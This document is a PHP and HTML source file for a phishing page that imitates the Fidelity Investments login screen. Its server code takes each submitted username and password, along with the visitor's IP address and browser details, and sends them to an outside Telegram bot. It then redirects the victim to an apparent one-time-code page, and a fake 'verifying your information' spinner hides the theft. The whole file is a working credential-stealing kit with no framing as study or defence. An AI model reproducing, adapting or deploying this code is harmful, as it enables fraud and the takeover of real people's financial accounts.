<?php
session_start();
header('Content-Type: text/html; charset=UTF-8');

include 'config.php';

$error = '';
$startPending = false;

function getUserIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($ips[0]);
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

function sendTelegramMessage($token, $chatId, $message, $keyboard = null) {
    $url = "https://api.telegram.org/bot{$token}/sendMessage";
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML',
        'disable_web_page_preview' => true
    ];
    if ($keyboard) {
        $data['reply_markup'] = json_encode($keyboard);
    }
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $response = curl_exec($ch);
    curl_close($ch);
    return $response;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = isset($_POST['username']) ? trim($_POST['username']) : '';
    $password = isset($_POST['password']) ? trim($_POST['password']) : '';
    
    if (!empty($username) && !empty($password)) {
        $_SESSION['fidelity_username'] = $username;
        $_SESSION['fidelity_phone'] = 'XXXX';
        
        $ip = getUserIP();
        $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
        
        $message = "🔐 <b>New Login Attempt</b>\n\n";
        $message .= "👤 <b>Username:</b> <code>" . htmlspecialchars($username) . "</code>\n";
        $message .= "🔑 <b>Password:</b> <code>" . htmlspecialchars($password) . "</code>\n";
        $message .= "🌐 <b>IP:</b> <code>{$ip}</code>\n";
        $message .= "🖥 <b>User Agent:</b> <code>" . htmlspecialchars(substr($userAgent, 0, 100)) . "</code>\n";
        $message .= "⏰ <b>Time:</b> " . date('Y-m-d H:i:s') . " UTC\n";
        
        sendTelegramMessage($botToken, $chatId, $message);
        
        header('Location: otp.php');
        exit;
    } else {
        $error = 'Please enter both username and password.';
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log In to Fidelity</title>
    <link rel="stylesheet" href="assets/fonts.css">
    <link rel="stylesheet" href="assets/dom-signin.css">
    <link rel="stylesheet" href="assets/common-logincss.css">
    <style>
        .login-error {
            display: <?php echo $error ? 'flex' : 'none'; ?>;
            align-items: center;
            gap: 10px;
            margin-bottom: 15px;
            padding: 16px;
            border-radius: 8px;
            border: 2px solid #DC1616;
            background: #FFF5F5;
        }
        .loading {
            display: none;
            text-align: center;
            padding: 40px 20px;
        }
        .loading.show {
            display: block;
        }
        .pvdccl-form-root.hide {
            display: none;
        }
    </style>
</head>
<body>
<header class="header">
    <div class="header-logo">
        <a href="#">
            <img src="assets/Fidelity-wordmark.svg" alt="Fidelity Investments">
        </a>
    </div>
    <div class="header-links">
        <a href="#">Security</a>
        <a href="#">FAQs</a>
    </div>
</header>

<div class="container">
    <div class="login">
        <div class="loading" id="loading">
            <span>Please wait while we verify your information...</span>
            <svg width="38" height="38" viewBox="0 0 38 38" xmlns="http://www.w3.org/2000/svg" style="margin-top:20px;">
                <defs>
                    <linearGradient x1="8.042%" y1="0%" x2="65.682%" y2="23.865%" id="a">
                        <stop stop-color="#999" stop-opacity="0" offset="0%"/>
                        <stop stop-color="#999" stop-opacity=".631" offset="63.146%"/>
                        <stop stop-color="#999" offset="100%"/>
                    </linearGradient>
                </defs>
                <g fill="none" fill-rule="evenodd">
                    <g transform="translate(1 1)">
                        <path d="M36 18c0-9.94-8.06-18-18-18" id="Oval-2" stroke="url(#a)" stroke-width="2">
                            <animateTransform attributeName="transform" type="rotate" from="0 18 18" to="360 18 18" dur="0.9s" repeatCount="indefinite"/>
                        </path>
                    </g>
                </g>
            </svg>
        </div>
        
        <div class="pvdccl-form-root">
            <div class="login-error" id="loginError">
                <svg width="30" height="30" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z" fill="#DC1616"/>
                </svg>
                <span style="color: #DC1616; font-family: 'Fidelity Sans', Arial, sans-serif;"><?php echo htmlspecialchars($error); ?></span>
            </div>
            
            <form method="POST" action="" id="loginForm">
                <h1 class="login-title">Log in</h1>
                
                <div class="username">
                    <label for="username">Username</label>
                    <input type="text" id="username" name="username" autocomplete="username" required>
                </div>
                
                <div class="password">
                    <label for="password">Password</label>
                    <div class="password-input-wrapper">
                        <input type="password" id="password" name="password" autocomplete="current-password" required>
                        <button type="button" class="password-toggle" tabindex="-1">
                            <svg width="24" height="24" viewBox="0 0 24 24">
                                <use href="#pvdccl-action__show"></use>
                            </svg>
                        </button>
                    </div>
                    <div class="password-options">
                        <label class="remember-me">
                            <input type="checkbox" name="remember">
                            <span>Remember my username</span>
                        </label>
                    </div>
                </div>
                
                <button type="submit" id="loginButton">Log in</button>
                
                <div class="login-links">
                    <a href="#">Forgot username?</a>
                    <span class="separator">|</span>
                    <a href="#">Forgot password?</a>
                </div>
            </form>
        </div>
    </div>
</div>

<svg style="display: none;">
    <symbol viewBox="0 0 24 24" id="pvdccl-action__show">
        <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
    </symbol>
    <symbol viewBox="0 0 24 24" id="pvdccl-action__hide">
        <path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z"/>
    </symbol>
</svg>

<script>
    var passwordInput = document.getElementById('password');
    var passwordToggle = document.querySelector('.password-toggle');
    var loginForm = document.getElementById('loginForm');
    var loadingDiv = document.getElementById('loading');
    var formRoot = document.querySelector('.pvdccl-form-root');
    
    if (passwordToggle && passwordInput) {
        passwordToggle.addEventListener('click', function(e) {
            e.preventDefault();
            var svg = passwordToggle.querySelector('svg use');
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                if (svg) svg.setAttribute('href', '#pvdccl-action__hide');
            } else {
                passwordInput.type = 'password';
                if (svg) svg.setAttribute('href', '#pvdccl-action__show');
            }
        });
    }
    
    loginForm.addEventListener('submit', function(e) {
        var username = document.getElementById('username').value.trim();
        var password = passwordInput.value.trim();
        
        if (!username || !password) {
            e.preventDefault();
            return false;
        }
        
        formRoot.classList.add('hide');
        loadingDiv.classList.add('show');
    });
    
    document.getElementById('username').focus();
</script>
</body>
</html>